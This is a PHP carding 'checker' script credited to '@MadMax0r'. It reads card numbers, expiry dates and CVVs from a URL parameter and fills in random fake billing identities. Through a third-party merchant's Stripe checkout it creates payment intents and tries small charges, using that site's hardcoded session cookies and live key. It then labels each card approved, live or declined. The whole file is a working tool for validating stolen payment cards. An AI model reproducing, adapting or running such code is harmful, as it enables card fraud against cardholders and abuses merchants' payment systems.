<?php
#[ SITE & CODED BY - @MadMax0r ]

#==================[SETUP]
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#==============[Randomizing Details Api]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$fname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$add = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$num = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

#=====================[1st REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: m.stripe.com';
$headers[] = 'Content-Length: 1464';
$headers[] = 'Accept: */*';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Content-Type: text/plain;charset=UTF-8';
$headers[] = 'Cookie: m=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f; private_machine_identifier=acRT5IL5%2BY1U%2Fu77FPt7Y04D4n0zwxchSccnmO10DCJB5LaI8nq8TRbDK8g5QTNqNH8%3D';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Origin: https://m.stripe.network';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://m.stripe.network/';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
#echo($result1);
$guid = trim(strip_tags(getStr($result1,'"guid": "','"')));

$muid = trim(strip_tags(getStr($result1,'"muid": "','"')));

$sid = trim(strip_tags(getStr($result1,'"sid": "','"')));
#echo "IDEMPOTENCY KEY: $tk<br><hr>";
#==================[2 REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m3u-editor.com/stripe/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: m3u-editor.com';
$headers[] = 'Accept: */*';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Cookie: cf_clearance=egivHQG_XQco1hD8LdhVXKrga8Xk.CrSUIxdApt4zQg-1648200309-0-150; XSRF-TOKEN=eyJpdiI6InlhVjhCWHhGenRrb3o1bkU2Wkh0eWc9PSIsInZhbHVlIjoiVW5mTDNcL1NzVXRNeXBwUGI1V0t0QXdZOGJCMkV1aEd6VmRZK1RrZTV1a2Z2RGw5XC9Ha1VOK0hmMG5GWHhCTmNwIiwibWFjIjoiMTY0ODIzM2RlMjcxMDQ5YzUxN2I4YWYwNjdhZGYzY2VhZmIyOWY5MGQ3ZTlhNmZjNjhkMDNhYjc4NmJlMjU4NCJ9; m3u_editor_session=eyJpdiI6IlhxXC9LYW40S0YwdGZnVHBQaVh2ajVnPT0iLCJ2YWx1ZSI6Im5tVjh0aEQ4OU1mb3prN2EyTTA1QVlxUmUrOGtSVHVkVlhcL1YrcE80eEYxXC8wak9OOFdURjJQaEZ5OEo2Z0kwbyIsIm1hYyI6IjkxYjc1MGFmNGI0MWVjMmY1OTFiM2U3YjhmODY4NmI0NWZlNjJlMDcyNGUxODQ5OTJjMDQ1YjZhMjVmMGEwNDkifQ%3D%3D; _ga_95RN74CDMB=GS1.1.1648199611.2.1.1648200401.0; _ga=GA1.1.702678414.1648196282; _fbp=fb.1.1648196286512.743131067; __stripe_mid='.$mid.'; intercom-session-xzrntqw8=RG1oZWY0aEN4Vkd5NEdWS0JHL25HTk5McS9tUVlGNDJLdUdtL21lb1pxWlMxcnl5U2x6dzRZa2lFTFRCS2p4cS0tN0Y0SGxyMHdLaEpFeUVhZDNleUJnZz09--52685c939301d3d1de53787d0c4cb6001c91f787; __stripe_sid='.$sid.'';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://m3u-editor.com/settings';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result2 = curl_exec($ch);
#echo($result2);
$pid = trim(strip_tags(getStr($result2,'"result":true,"client_secret":"','_secret_')));
$psid = trim(strip_tags(getStr($result2,'"result":true,"client_secret":"','"')));
#echo "PI ID: $pid<br><hr>";
#echo "PI SECRET ID: $psid<br><hr>";
#==================[3 REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pid.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=jhon+jmdke&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]='.$guid.'&payment_method_data[muid]='.$muid.'&payment_method_data[sid]='.$sid.'&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc562495a3%3B+stripe-js-v3%2Fc562495a3&payment_method_data[time_on_page]=514268&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51I50nYD7E5KeLz7YoQinJtyPrpoFDfh1FJkobELxo1n2QqfvD2vak08BILK8iLStEzFKSC8RYlw4PnjayhQadOj900FgmYUdQj&client_secret='.$pid.'');
$result3 = curl_exec($ch);
#echo($result3);
$msg = trim(strip_tags(getStr($result3,'"message": "','"')));
#echo "MESSAGE: $msg<br><hr>";
#===============[Card Response]
if((strpos($result3,  '"status": "succeeded"'))) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Aprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Charged 1$ [@MadMax0r]</span></i></font>";
}
elseif
(strpos($result3,  "Your card has insufficient funds.")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Aprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@MadMax0r]";
}
elseif
(strpos($result3,  "do_not_honor")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Ccn Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Ccn Live</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@MadMax0r]";
}
elseif
(strpos($result3,  "Your card was declined.")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Ccn Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Ccn Live</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@MadMax0r]";
}
elseif
(strpos($result3,  "card_declined")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Ccn Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Ccn Live</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@MadMax0r]";
}
elseif
(strpos($result3,  "Invalid account.")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Ccn Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Ccn Live</span></i></font> <br><font class='badge badge-dark'>Message : $msg [@MadMax0r]";
}
elseif
(strpos($result3,"Your card has insufficient funds")) {
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Reprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Message : 3d Secure Card. [@MadMax0r]";
}
else
{
  echo "<font size=2 color='black'>  <font class='badge badge-info'>#Reprovadas Card : $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Message : $msg [@MadMax0r]";
}

curl_close($ch);
ob_flush();
?>
